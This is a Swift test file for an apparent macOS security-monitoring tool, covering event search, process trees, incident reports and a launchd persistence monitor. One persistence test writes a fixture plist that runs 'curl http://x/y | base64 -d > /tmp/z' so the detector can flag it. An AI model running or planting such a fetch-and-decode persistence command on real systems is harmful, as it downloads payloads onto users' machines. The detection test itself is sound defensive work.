import XCTest
import Foundation
@testable import ViruxForensics
import ViruxCore
import ViruxRespond

private func ev(_ kind: EventKind, pid: Int32, ppid: Int32? = nil, path: String? = nil,
                hash: String? = nil, sev: Severity = .none, at t: Date = Date(),
                signing: String? = nil) -> SecurityEvent {
    SecurityEvent(timestamp: t, kind: kind,
                  process: ProcessRef(pid: pid, ppid: ppid, executablePath: path, signingID: signing),
                  filePath: path, fileHash: hash, severity: sev, confidence: .low, source: "test")
}

final class SearchTests: XCTestCase {
    var store: EventStore!
    var tmp: String!
    override func setUpWithError() throws {
        tmp = FileManager.default.temporaryDirectory.appendingPathComponent("virux-fx-\(UUID().uuidString)").path
        try FileManager.default.createDirectory(atPath: tmp, withIntermediateDirectories: true)
        store = try EventStore(path: (tmp as NSString).appendingPathComponent("e.db"))
    }
    override func tearDownWithError() throws { try? FileManager.default.removeItem(atPath: tmp) }

    func testSearchEventsByKindAndSeverityAndPath() throws {
        let old = Date().addingTimeInterval(-7200)
        _ = try store.insert(ev(.exec, pid: 1, path: "/tmp/a", at: Date()))
        _ = try store.insert(ev(.open, pid: 2, path: "/Users/x/secret.txt", hash: "abc", sev: .high))
        _ = try store.insert(ev(.exec, pid: 3, path: "/tmp/b", at: old))

        XCTAssertEqual(store.searchEvents(EventQuery(kinds: [.exec])).count, 2)
        XCTAssertEqual(store.searchEvents(EventQuery(minSeverity: .medium)).count, 1)
        XCTAssertEqual(store.searchEvents(EventQuery(pathContains: "secret")).count, 1)
        XCTAssertEqual(store.searchEvents(EventQuery(fileHash: "abc")).count, 1)
        XCTAssertEqual(store.searchEvents(EventQuery(since: Date().addingTimeInterval(-60))).count, 2)
    }

    func testSearchEventsByIds() throws {
        let id1 = try store.insert(ev(.exec, pid: 1, path: "/tmp/a"))
        _ = try store.insert(ev(.open, pid: 2, path: "/tmp/b"))
        let rows = store.searchEvents(EventQuery(ids: [id1]))
        XCTAssertEqual(rows.count, 1)
        XCTAssertEqual(rows.first?.id, id1)
    }

    func testSearchDetectionsBySeverityAndTitle() throws {
        try store.insertDetection(Detection(title: "Mass file rename burst", reason: "r", severity: .critical, confidence: .medium))
        try store.insertDetection(Detection(title: "Persistence location modified", reason: "r", severity: .medium, confidence: .medium))
        XCTAssertEqual(store.searchDetections(DetectionQuery()).count, 2)
        XCTAssertEqual(store.searchDetections(DetectionQuery(minSeverity: .high)).count, 1)
        XCTAssertEqual(store.searchDetections(DetectionQuery(titleContains: "rename")).first?.severity, .critical)
    }
}

final class ProcessTreeTests: XCTestCase {
    func testBuildsAndRendersTree() {
        let events = [
            ev(.exec, pid: 1, ppid: 0, path: "/sbin/launchd", signing: "com.apple.launchd"),
            ev(.exec, pid: 100, ppid: 1, path: "/Applications/Safari.app/Contents/MacOS/Safari", signing: "com.apple.Safari"),
            ev(.exec, pid: 101, ppid: 100, path: "/bin/bash", signing: "com.apple.bash"),
            ev(.open, pid: 101, path: "/tmp/x"),
        ]
        let roots = ProcessTreeBuilder.build(from: events)
        XCTAssertEqual(roots.count, 1)
        XCTAssertEqual(roots[0].pid, 1)
        XCTAssertEqual(roots[0].children.first?.pid, 100)
        XCTAssertEqual(roots[0].children.first?.children.first?.pid, 101)

        let ascii = ProcessTreeRenderer.ascii(roots)
        XCTAssertTrue(ascii.contains("launchd"))
        XCTAssertTrue(ascii.contains("Safari"))
        XCTAssertTrue(ascii.contains("bash"))
    }

    func testAncestryOrder() {
        let events = [
            ev(.exec, pid: 1, ppid: 0, path: "/sbin/launchd"),
            ev(.exec, pid: 100, ppid: 1, path: "/bin/zsh"),
            ev(.exec, pid: 200, ppid: 100, path: "/tmp/evil"),
        ]
        let chain = ProcessTreeBuilder.ancestry(of: 200, from: events)
        XCTAssertEqual(chain.map { $0.pid }, [200, 100, 1])
    }

    func testUnsignedFlagged() {
        let roots = ProcessTreeBuilder.build(from: [ev(.exec, pid: 5, ppid: 0, path: "/tmp/evil")])
        XCTAssertTrue(roots[0].isUnsigned)
    }
}

final class ReportTests: XCTestCase {
    func testReportIncludesEvidenceChainAndActions() throws {
        let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("virux-rep-\(UUID().uuidString)").path
        try FileManager.default.createDirectory(atPath: tmp, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(atPath: tmp) }
        let store = try EventStore(path: (tmp as NSString).appendingPathComponent("e.db"))

        let id1 = try store.insert(ev(.exec, pid: 100, ppid: 1, path: "/Applications/Safari.app/Contents/MacOS/Safari", signing: "com.apple.Safari"))
        let id2 = try store.insert(ev(.exec, pid: 101, ppid: 100, path: "/bin/bash", signing: "com.apple.bash"))
        let det = Detection(title: "Host application spawned a shell", reason: "Safari spawned bash",
                            severity: .medium, confidence: .medium, evidenceEventIDs: [id1, id2])
        let detID = try store.insertDetection(det)
        var det2 = det; det2.id = detID

        let qstore = try QuarantineStore(directory: (tmp as NSString).appendingPathComponent("q"), store: store)
        let report = ReportBuilder.build(detection: det2, store: store, quarantineStore: qstore)
        let md = report.markdown()

        XCTAssertTrue(md.contains("Host application spawned a shell"))
        XCTAssertTrue(md.contains("Safari spawned bash"))
        XCTAssertTrue(md.contains("pid 101"))
        XCTAssertTrue(md.contains("Recommended next actions"))
        XCTAssertEqual(report.evidenceEvents.count, 2)
        XCTAssertEqual(report.processChain.first?.pid, 101)
        XCTAssertTrue(report.relatedFiles.contains("/bin/bash"))
    }
}

final class GraphTests: XCTestCase {
    func testSVGIsWellFormedAndEscapes() {
        let roots = ProcessTreeBuilder.build(from: [
            ev(.exec, pid: 1, ppid: 0, path: "/sbin/launchd"),
            ev(.exec, pid: 2, ppid: 1, path: "/tmp/a<b>&c"),
        ])
        let svg = GraphRenderer.processTreeSVG(roots)
        XCTAssertTrue(svg.hasPrefix("<svg"))
        XCTAssertTrue(svg.hasSuffix("</svg>\n"))
        XCTAssertTrue(svg.contains("pid 1") || svg.contains("[1]"))
        XCTAssertTrue(svg.contains("&lt;b&gt;"), "text must be XML-escaped")
        XCTAssertFalse(svg.contains("<b>"))
    }
}

final class PersistenceTests: XCTestCase {
    var tmp: String!
    override func setUpWithError() throws {
        tmp = FileManager.default.temporaryDirectory.appendingPathComponent("virux-pm-\(UUID().uuidString)").path
        try FileManager.default.createDirectory(atPath: tmp, withIntermediateDirectories: true)
    }
    override func tearDownWithError() throws { try? FileManager.default.removeItem(atPath: tmp) }

    private func writePlist(_ name: String, label: String, args: [String]) throws -> String {
        let path = (tmp as NSString).appendingPathComponent(name)
        let plist: [String: Any] = ["Label": label, "ProgramArguments": args, "RunAtLoad": true]
        let data = try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0)
        try data.write(to: URL(fileURLWithPath: path))
        return path
    }

    func testDetectsAddedAndSuspiciousAndDedupes() throws {
        _ = try writePlist("com.benign.plist", label: "com.benign", args: ["/Applications/Foo.app/Contents/MacOS/Foo"])
        let monitor = PersistenceMonitor(directories: [tmp])

        let baseline = monitor.scan()
        XCTAssertEqual(baseline.items.count, 1)
        XCTAssertFalse(baseline.items[0].suspicious)

        _ = try writePlist("com.evil.plist", label: "com.evil", args: ["/bin/bash", "-c", "curl http://x/y | base64 -d > /tmp/z"])
        let now = monitor.scan()
        let changes = monitor.diff(previous: baseline, current: now)
        XCTAssertEqual(changes.count, 1)
        XCTAssertEqual(changes[0].kind, .added)
        XCTAssertTrue(changes[0].item.suspicious)
        XCTAssertTrue(changes[0].item.reasons.contains { $0.contains("curl") })

        let alerts = monitor.alerts(for: changes)
        XCTAssertEqual(alerts.count, 1)
        XCTAssertEqual(alerts[0].severity, .high)

        // dedupe: same change must not alert twice
        XCTAssertEqual(monitor.alerts(for: changes).count, 0)
    }

    func testRemovedItemsDoNotAlert() throws {
        let p = try writePlist("com.tmp.plist", label: "com.tmp", args: ["/bin/echo"])
        let monitor = PersistenceMonitor(directories: [tmp])
        let before = monitor.scan()
        try FileManager.default.removeItem(atPath: p)
        let after = monitor.scan()
        let changes = monitor.diff(previous: before, current: after)
        XCTAssertEqual(changes.first?.kind, .removed)
        XCTAssertTrue(monitor.alerts(for: changes).isEmpty)
    }
}
